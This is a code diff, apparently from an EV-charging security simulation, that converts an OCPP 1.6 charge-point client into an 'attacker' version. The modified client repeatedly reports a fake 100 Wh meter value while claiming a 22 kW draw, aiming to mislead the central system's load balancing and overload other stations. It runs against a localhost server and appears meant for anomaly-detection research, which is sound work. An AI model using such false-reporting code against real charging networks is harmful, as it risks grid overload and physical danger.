@@ -8,60 +8,74 @@ from ocpp.v16 import ChargePoint as cp, call, call_result
 from ocpp.v16.enums import RegistrationStatus, RemoteStartStopStatus
 from ocpp.routing import on
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - [İSTEMCİ] - %(message)s')
+# Loglama formatını ayarlayalım
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - [SALDIRGAN CP] - %(message)s')
 
-# --- DONANIM (vcan0) AYARI ---
-try:
-    can_bus = can.interface.Bus(channel='vcan0', interface='socketcan')
-    logging.info("Donanım (vcan0) bağlantısı BAŞARILI.")
-except Exception:
-    # Hata vermemesi için pass geçiyoruz, donanım yoksa simülasyon devam eder
-    can_bus = None
-
-def donanima_komut_yolla(can_id, data):
-    if can_bus:
-        try:
-            msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
-            can_bus.send(msg)
-            logging.info(f"Donanıma İletildi -> ID: {hex(can_id)} Data: {data}")
-        except Exception as e:
-            logging.error(f"Donanım Hatası: {e}")
-
-class SablonChargePoint(cp):
+class AttackerChargePoint(cp):
 
     async def send_meter_values(self):
-        """ Düzenli enerji raporu gönderir (NORMAL DAVRANIŞ) """
-        sayac = 0
+        """ 
+        ANOMALİ SENARYOSU: Yük Dengeleme Algoritmasını Manipüle Etme
+        Amaç: Gerçekte yüksek güç çekerken, düşük güç raporlayarak 
+        CSMS'in diğer istasyonlara aşırı yük bindirmesini sağlamak (DoS).
+        """
+        
+        # SALDIRI PARAMETRELERİ
+        GERCEK_TUKETIM = 22000  # Wh (Fiziksel olarak çekilen devasa güç - 22kW)
+        SAHTE_RAPOR = 100       # Wh (Merkeze söylenen yalan - 0.1kW)
+        
+        logging.info(f"--- SALDIRI BAŞLATILIYOR ---")
+        logging.info(f"Fiziksel Durum: {GERCEK_TUKETIM}W çekiliyor (Tehlikeli Düzey)")
+        logging.info(f"Strateji: Düşük raporlayıp kapasiteyi başkasına kullandırtmak.")
+
         while True:
-            sayac += 10 # Normal artış
+            # 1. Adım: Sahte Veri Hazırla
             payload = [{
                 "timestamp": datetime.now(timezone.utc).isoformat(),
-                "sampled_value": [{"value": str(sayac), "unit": "Wh"}]
+                "sampled_value": [{
+                    "value": str(SAHTE_RAPOR), # YALAN VERİ
+                    "context": "Sample.Periodic",
+                    "measurand": "Energy.Active.Import.Register",
+                    "unit": "Wh"
+                }]
             }]
-            # Göndermek için alttaki satırı aktif edebilirsiniz
-            # await self.call(call.MeterValues(connector_id=1, meter_value=payload))
-            await asyncio.sleep(5)
+            
+            # 2. Adım: Veriyi Gönder ve Logla
+            try:
+                # Loglarda gerçek durumu vs gönderilen yalanı kıyaslayalım
+                logging.warning(f"⚠️ MANİPÜLASYON: Gerçek Tüketim: {GERCEK_TUKETIM}W | Gönderilen Rapor: {SAHTE_RAPOR}W")
+                
+                await self.call(call.MeterValues(connector_id=1, meter_value=payload))
+                
+            except Exception as e:
+                logging.error(f"Gönderim hatası: {e}")
+            
+            # 5 saniyede bir raporla
+            await asyncio.sleep(5) 
 
     @on('RemoteStartTransaction')
     async def on_remote_start(self, id_tag, **kwargs):
-        logging.info(f"KOMUT ALINDI: Şarj Başlat (Kart: {id_tag})")
-        donanima_komut_yolla(0x200, [0x01, 0x01]) # Röleyi aç
+        logging.info(f"Komut Alındı: Başlat ({id_tag}) - Tam Güç Çekmeye Başlanıyor...")
         return call_result.RemoteStartTransaction(status=RemoteStartStopStatus.accepted)
 
     @on('RemoteStopTransaction')
     async def on_remote_stop(self, transaction_id, **kwargs):
-        logging.info(f"KOMUT ALINDI: Şarj Durdur (TxID: {transaction_id})")
-        donanima_komut_yolla(0x201, [0x00, 0x00]) # Röleyi kapat
+        logging.info(f"Komut Alındı: Durdur ({transaction_id})")
         return call_result.RemoteStopTransaction(status=RemoteStartStopStatus.accepted)
 
 async def main():
     async with websockets.connect('ws://localhost:9000/CHARGER-001', subprotocols=['ocpp1.6']) as ws:
-        logging.info("Sunucuya bağlanıldı.")
-        client = SablonChargePoint('CHARGER-001', ws)
-        await asyncio.gather(client.start(), client.send_boot_notification())
+        logging.info("CSMS'e Bağlanıldı (Firmware Hacklendi - Root Yetkisi)")
+        client = AttackerChargePoint('CHARGER-001', ws)
+        
+        await asyncio.gather(
+            client.start(),
+            client.send_boot_notification(),
+            client.send_meter_values() # Saldırıyı başlat
+        )
 
 if __name__ == '__main__':
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        if can_bus: can_bus.shutdown()
+        pass
